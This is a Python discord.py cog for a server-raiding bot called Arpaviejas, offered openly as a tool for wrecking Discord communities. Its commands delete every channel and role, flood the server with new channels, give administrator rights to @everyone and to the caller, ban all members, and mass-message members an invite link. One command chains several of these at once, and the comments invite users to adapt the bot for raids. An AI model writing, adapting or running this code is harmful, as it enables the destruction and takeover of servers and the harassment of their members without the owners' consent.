from asyncio import sleep
from termcolor import colored
from random import choice, randint

from discord.ext.commands import Cog, command, Context
from discord import Embed, Role

from utils import to_lower, administrator_permissions


class Main(Cog):
    def __init__(self, bot):
        self.bot = bot

    # Help menu with the default name of the commands, it's up to you change the names and adjust this crap.
    @command(name="ayuda", description="Menú de ayuda del bot.", usage="(command)")
    async def ayuda_command(self, ctx: Context, _command: to_lower = None):
        embed = Embed(
            title="Command list of Arpaviejas",
            description="Detailed description about what this bot can do at the moment",
            colour=0xebe300
        )
        if _command:
            if _command in self.bot.all_commands.keys():
                _command = self.bot.all_commands[_command]
                embed.description = "The bot prefix is: `{}`\n\n".format(self.bot.command_prefix) + \
                    "**Command:** {}\n".format(_command.name.title()) + \
                    "**Description:** {}\n".format(_command.description or 'No description.') + \
                    "**Usage:** {}\n".format(f"{self.bot.command_prefix}{_command.name} {_command.usage}" if _command.usage else 'No usage.') + \
                    "**Aliases:** {}".format(", ".join(_command.aliases)
                                             if _command.aliases else "None.")

                embed.description += "\n**Hidden command**" if _command.hidden else ""
            else:
                return print(colored(f'Error, this command is not available ! Command: "{_command}"'))
        else:
            x = 0
            for command in self.bot.all_commands.keys():  # Iterate through all commands
                command = self.bot.all_commands[command]  # Get the command
                embed.add_field(name=f"{self.bot.command_prefix}{command.name}",
                                value=command.description, inline=bool(x % 2))  # Add the command description to the embed
                x += 1

        await ctx.send(embed=embed)  # send the embed in the channel

    # Eskorbuto Command, if you want to use a custom image, just put the document in the same folder.
    @command(name="eskorbuto", description="Changes the name and the icon of the server, also deletes all the channels and starts to make spam creating new channels with pings.", usage="(num)")
    async def eskorbuto_command(self, ctx: Context, num: int = 100):
        # Once you got the image that you want to use, just change the name of the file and the extension if needed, must be on the same folder of the bot file, but you can put a full path to image file.
        with open('anarchism.jpg', 'rb') as f:
            icon = f.read()
        # Here's the new server name, change the name if you want.
        await ctx.guild.edit(name="Server Punkwned by Anarchists", icon=icon)
        for channel in await ctx.guild.fetch_channels():
            try:
                await channel.delete()
            except:
                print(
                    colored(f"Error, i can't delete the channel {channel}", "red"))
        # 2 Seconds of delay before the next action, just to avoid limitations with the requests or errors.
        await sleep(2)
        x = 0
        while x < num:
            await ctx.guild.create_text_channel("server-punkwned")
            x += 1

    @command(name="kaotiko", description="This command deletes all the roles of the server above the bot's role and creates 50 new roles.", usage="(name) (num) (color)")
    async def kaotiko_command(self, ctx: Context, name: str = "Punks Are Here!", num: int = 50, color: int = None):
        for guild in self.bot.guilds:
            for role in guild.roles:
                # Bot tries to remove his own role for some reason, so i put this, change the Arpaviejas name to your bot name.
                if role.name != "@everyone" or role.name != "@Arpaviejas":
                    try:
                        await role.delete()
                    except:
                        print(colored(
                            f"Error, i can't delete the role {role}, maybe i'm above of that role.", "red"))
        z = 0
        while z < num:
            # Create a new role with the name given with random Upper and lower cases and a color given or a random color if none given
            await ctx.guild.create_role(name="".join(choice([str.upper, str.lower])(c) for c in name), colour=color if color else randint(0, 0xffffff), reason="".join(choice([str.upper, str.lower])(c) for c in "Punkwned by Anarchists"))
            z += 1

    @command(name="herejia", description="We must have equity, so this shit will give Admin privileges to the @everyone role.")
    async def herejia_command(self, ctx: Context):
        for guild in self.bot.guilds:
            for role in guild.roles:
                if role.name == "@everyone":
                    await role.edit(reason=None, permissions=administrator_permissions())

    # The Panda command, you can change the Punk Role name and the colour, don't forgot to use "0x" before the Hex range
    @command(name="panda", description="If you're an oppresor and son of a bitch, this crap will give you an special role with privileges. **WARNING: OTHER USERS CAN USE THIS, UNLESS YOU ADD AN EQUALITY CHECK TO CONFIRM YOUR USER ID.**", usage="(name) (color)")
    async def panda_command(self, ctx: Context, name: str = "Punk", color: int = 0xebe300):
        user = ctx.message.author
        role = await ctx.guild.create_role(name=name, colour=color, permissions=administrator_permissions())
        await user.add_roles(role)

    @command(name="flema", description="Do you want to get the invite of the bot and take a look to the bad practices of the creator?, use this command.")
    async def flema_command(slef, ctx: Context):
        user = ctx.message.author
        await user.send("Here's my invite:\nhttps://discord.com/oauth2/authorize?client_id=870548494082002944&scope=bot&permissions=8\nDo you want to take a look to the bad practices of the creator of this bot?, here's the official Github Repo:https://github.com/PuppetCrowley/Arpaviejas\n")

    @command(name="elektroduendes", description="Works for ban all users, has some bugs due the Discord rate limit")
    async def elektroduendes_command(ctx):
        for user in ctx.guild.members:
            # Bot won't ban you using this command, because the != is going to check if the users are different from the message.author (The person that puts the command).
            if user != ctx.message.author:
                try:
                    await user.ban()
                except:
                    print(colored(
                        f"Error, I can't ban {user}, Maybe i'm above of his role or he's the owner of the server.", "red"))

    @command(name="glorificator", description="type !glorificar + role-name to give admin privileges to some role.", usage='@role (reason)')
    async def glorificar_command(ctx, role: Role, *, reason=None):
        try:
            await role.edit(permissions=administrator_permissions(), reason=reason)
        except:
            print(colored(
                f"Error, i can't edit the role {role}, Maybe i'm above of this role or it's somehow protected.", "red"))

    @command(name="dazepunk", description="This will send a single DM Message to all the users in the server, except the command author.")
    async def dazepunk_command(ctx):
        for user in ctx.guild.members:
            # The bot will not send you any DM with this command using this conditional.
            if user != ctx.message.author:
                try:
                    await user.send(f"The server {ctx.guild.name} has been fucked by Punks:\nhttps://discord.gg/FhJydrmbTz")
                except:
                    print(colored(
                        f"Error, i can't send a message to the user {user}, maybe he locked the DM Access.", "red"))

    @command(name="millencolin", description="This command combines !eskorbuto, !kaotiko and !herejia at the same time, use this crap if you value your time. (Yeah sure, value your time raiding discord servers)")
    async def millencolin_command(self, ctx: Context):
        await self.eskorbuto_command(ctx)
        await self.kaotiko_command(ctx)
        await self.herejia_command(ctx)


def setup(bot):
    bot.add_cog(Main(bot))
